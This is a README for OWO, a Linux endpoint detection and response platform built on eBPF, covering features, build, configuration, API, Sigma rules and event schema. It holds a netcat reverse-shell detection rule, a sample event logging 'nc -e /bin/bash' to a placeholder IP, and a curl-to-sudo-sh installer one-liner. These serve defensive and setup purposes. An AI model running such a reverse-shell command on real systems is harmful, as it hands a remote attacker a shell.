# OWO — Linux EDR Platform

![OWO](assets/owo.png)

OWO is a Linux Endpoint Detection & Response (EDR) platform built with Go and eBPF. It provides kernel-level visibility into process, file, network, and privilege activity across Linux endpoints, with a centralized backend for detection, alerting, and incident response.

---

## Features

- **eBPF Kernel Monitoring** — hooks into execve, file (openat/unlink/rename), network (connect/sendto), privilege escalation, process exit, kernel module loads, and write events
- **Sigma Rule Detection** — streaming evaluation of Sigma-compatible rules against normalized events
- **Process Tree** — real-time and historical process tree per host, visualized in the web UI
- **Antivirus (ClamAV)** — on-demand and real-time AV scanning with auto-install support
- **DLP Scanning** — detects sensitive data (credit cards, SSNs, AWS keys, private keys, passwords, bearer tokens) in files
- **Device Control** — USB/write monitoring via eBPF write events
- **Incident Response (IR)** — isolate host, kill process, collect triage artifacts, release from isolation
- **GTFOBins Enrichment** — tags events with known LOL (Living-off-the-Land) binaries
- **MITRE ATT&CK Tagging** — maps events and alerts to ATT&CK techniques
- **Multi-tenant** — `tenant_id` scoped across all events, alerts, and rules
- **Web Dashboard** — Next.js UI with real-time alert stream, host inventory, rule management, and process tree visualization
- **NATS JetStream** — decoupled event pipeline with replay support

---

## Architecture

```
  [AGENTS / eBPF]
       |  execve, file, network, privilege, exit, module
       |  NATS / gRPC (mTLS)
       v
  [INGEST] --> [NORMALIZE] --> [DETECTION] --> [ALERTS]
       |              |               |              |
       v              v               v              v
  [ClickHouse]   [PostgreSQL]    [NATS JetStream]  [IR DISPATCHER]
                                                        |
                                                        v
                                                  [AGENT: IR commands]

  [WEB UI (Next.js)] <--> [API Gateway] <--> PostgreSQL / NATS
```

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full design document including schema, API spec, risk scoring, and process tree engine.

---

## Project Structure

```
OWO/
├── bpf/                  # eBPF C programs (execve, file, network, privilege, exit, write, module, process)
├── cmd/
│   ├── edr-client/       # Main agent binary
│   ├── api/              # REST API gateway
│   ├── ingest/           # Event ingestion service
│   ├── normalize/        # Event normalization service
│   ├── detection/        # Sigma detection engine
│   └── ir-dispatcher/    # Incident response command dispatcher
├── pkg/
│   ├── monitor/          # eBPF loaders (execve, file, network, privilege, exit, write, module, process)
│   ├── events/           # ECS-like event schema
│   ├── detection/        # Rule evaluation engine
│   ├── sigma/            # Sigma YAML parser and compiler
│   ├── behavior/         # Behavioral correlation (e.g. reverse shell detection)
│   ├── dlp/              # Data Loss Prevention scanner
│   ├── clamav/           # ClamAV integration
│   ├── devicecontrol/    # Device control (USB/write)
│   ├── gtfobins/         # GTFOBins enrichment
│   ├── enrich/           # Exec enrichment (SHA256, inode, container ID)
│   ├── proc/             # /proc utilities
│   ├── ir/               # IR command types
│   ├── edr/              # Agent transport (NATS, remote)
│   ├── store/            # PostgreSQL store
│   ├── config/           # Config loader
│   └── logger/           # Structured logger
├── frontend/             # Next.js web dashboard
├── deploy/               # Docker Compose, Dockerfiles, Nginx, DB init schemas
├── sigma/rules/          # Sigma YAML detection rules
├── contrib/
│   ├── gtfobins.json     # GTFOBins data
│   ├── owo.service       # systemd unit
│   └── owo.logrotate     # logrotate config
├── config.yaml           # Agent config (dev)
├── config.production.yaml# Agent config (production)
└── Makefile              # Build eBPF objects + agent binary
```

---

## Requirements

### Agent (Linux host)
- Linux kernel >= 5.x with BTF enabled
- Root privileges (required for eBPF/kprobe)
- Go 1.23+
- `clang`, `llvm`, `linux-headers-$(uname -r)` (for building eBPF)

```bash
# Debian/Kali
apt install clang llvm linux-headers-$(uname -r) golang-go
```

### Backend & UI
- Docker and Docker Compose

---

## Build

```bash
# Build eBPF objects and agent binary
make

# Build only eBPF
make bpf

# Build only Go binary
make go

# Update GTFOBins data
make fetch-gtfobins

# Clean build artifacts
make clean
```

Output binary: `bin/edr-client`

---

## Configuration

Edit `config.yaml` (development) or `config.production.yaml` (production):

```yaml
agent:
  name: ""        # agent name (auto-detected if empty)
  hostname: ""    # override hostname
  group: ""       # agent group label

output:
  file:
    enabled: true
    path: "/var/log/edr/events.jsonl"
  stderr: false   # print events to console (dev only)
  nats:
    enabled: true
    url: "nats://127.0.0.1:4222"
    subject: "events.default"
    tenant_id: "default"

monitor:
  execve: true
  file_events: true
  network_events: true
  privilege_events: true
  exit_events: true
  module_events: true
  write_events: false          # set true for Device Control (USB copy monitoring)
  process_events: false
  file_watch_all_paths: false
  sigma_rules_path: "sigma/rules"
  clamav_scan_paths: ["/tmp", "/var/tmp", "/home"]
  realtime_av_scan: false      # scan each executed binary in real-time
  dlp_scan_paths: ["/tmp", "/var/tmp", "/home"]
  gtfobins_path: "contrib/gtfobins.json"

logging:
  level: warn
```

---

## Agent Installation

For full installation instructions (one-liner installer, package install, config reference, service management, troubleshooting) see:

**[docs/AGENT-INSTALL.md](docs/AGENT-INSTALL.md)**

### Quick start (one-liner)

```bash
curl -fsSL https://github.com/adriyansyah-mf/OWO/releases/latest/download/install.sh | sudo NATS_URL=nats://192.168.1.3:4222 sh
```

> Replace `192.168.1.3` with the IP of your backend server.

### Run from source

```bash
# Run with default config
sudo ./bin/edr-client

# Run with custom config
sudo ./bin/edr-client -config config.production.yaml
```

---

## Deploy Backend Stack

```bash
cd deploy

# Start full stack (NATS, PostgreSQL, Redis, backend services, frontend, Nginx)
docker compose up -d

# Start only infrastructure (NATS, Postgres, Redis)
docker compose -f docker-compose.infra.yml up -d
```

Services:
| Service | Port | Description |
|---------|------|-------------|
| Nginx (proxy) | 80 | Web UI + API reverse proxy |
| API Gateway | 8080 | REST API (`/api/v1/...`) |
| NATS | 4222 / 8222 | Message bus / monitoring |
| PostgreSQL | 5432 | Metadata (hosts, rules, alerts, IR log) |
| Redis | 6379 | Rule cache for hot-reload |
| Frontend (Next.js) | — | Web dashboard (served via Nginx) |

---

## API Reference

```
# Hosts
GET    /api/v1/hosts                    # List hosts
GET    /api/v1/hosts/{id}               # Host detail + risk score
GET    /api/v1/hosts/{id}/process-tree  # Process tree

# Alerts
GET    /api/v1/alerts                   # List alerts
GET    /api/v1/alerts/{id}              # Alert detail
POST   /api/v1/alerts/{id}/acknowledge  # Acknowledge alert

# Rules
GET    /api/v1/rules                    # List rules
POST   /api/v1/rules                    # Upload Sigma rule (YAML)
PUT    /api/v1/rules/{id}               # Update rule
DELETE /api/v1/rules/{id}               # Delete rule
POST   /api/v1/rules/{id}/enable        # Enable rule
POST   /api/v1/rules/{id}/disable       # Disable rule

# Incident Response
POST   /api/v1/ir/isolate               # Isolate host (body: { "host_id": "..." })
POST   /api/v1/ir/release               # Release host from isolation
POST   /api/v1/hosts/{id}/kill-process  # Kill process (body: { "pid": 12345 })
POST   /api/v1/hosts/{id}/collect       # Collect triage artifacts
GET    /api/v1/ir/actions               # IR action audit log

# AV / DLP
POST   /api/v1/av/scan                  # Trigger AV scan
GET    /api/v1/dlp/results              # DLP scan results
GET    /api/v1/dlp/patterns             # List DLP patterns
POST   /api/v1/dlp/patterns             # Add DLP pattern

# Health
GET    /api/v1/health
```

---

## Detection Rules (Sigma)

Place Sigma-compatible YAML rules in `sigma/rules/`. Rules are evaluated in streaming mode against normalized events.

Example rule structure:
```yaml
title: Suspicious Netcat Reverse Shell
id: proc-lnx-netcat-revshell
status: test
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains: ' -e '
    Image|endswith:
      - '/nc'
      - 'ncat'
  condition: selection
level: high
tags:
  - attack.execution
  - attack.t1059
```

---

## Event Schema

Events are normalized to an ECS-like schema:

```json
{
  "@timestamp": "2026-02-15T12:34:56.789Z",
  "tenant_id": "default",
  "host_id": "host-abc123",
  "event_type": "process_start",
  "process": {
    "pid": 1234,
    "ppid": 1000,
    "executable": "/usr/bin/nc",
    "command_line": "nc -e /bin/bash 10.0.0.1 4444",
    "name": "nc",
    "hash": { "sha256": "..." }
  },
  "user": { "id": "1000", "name": "user" },
  "host": { "hostname": "server01" },
  "threat": {
    "mitre": ["T1059"],
    "gtfobins": ["shell"]
  }
}
```

---

## DLP Patterns

Built-in patterns (configurable via API):

| ID | Pattern | Severity |
|----|---------|----------|
| `cc` | Credit Card numbers | High |
| `ssn` | Social Security Numbers | High |
| `aws_key` | AWS Access Keys (`AKIA...`) | Critical |
| `aws_secret` | AWS Secret Keys | Critical |
| `api_key` | Generic API keys | High |
| `private_key` | PEM private keys | Critical |
| `password` | Passwords in config files | Medium |
| `bearer` | Bearer tokens | High |

---

## Risk Scoring

Host risk scores are calculated as:

```
score = base_score × mitre_mult × recency_decay

base_score  = Σ (severity_weight × count) / max_alerts
  critical=10, high=5, medium=2, low=1

mitre_mult  = 1 + (0.1 × unique_MITRE_techniques_last_24h)
recency     = 1.0 (<1h) | 0.8 (<24h) | 0.5 (older)
```

---

## Security Notes

- The agent runs as **root** — restrict the binary and config to root-only access.
- Use the provided systemd unit with hardening options (`contrib/owo.service`).
- Do not store credentials in `config.yaml` in plain text if the file is world-readable; use environment variables for sensitive values.
- See [SECURITY.md](SECURITY.md) for the vulnerability disclosure policy.

---

## Changelog

See [CHANGELOG.md](CHANGELOG.md).

---

## License

Copyright (c) 2026 OWO Contributors

This project is licensed under the **GNU General Public License v2.0 or later (GPL-2.0-or-later)**.

You are free to redistribute and/or modify this software under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.

This software is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the [LICENSE](LICENSE) file for the full license text.
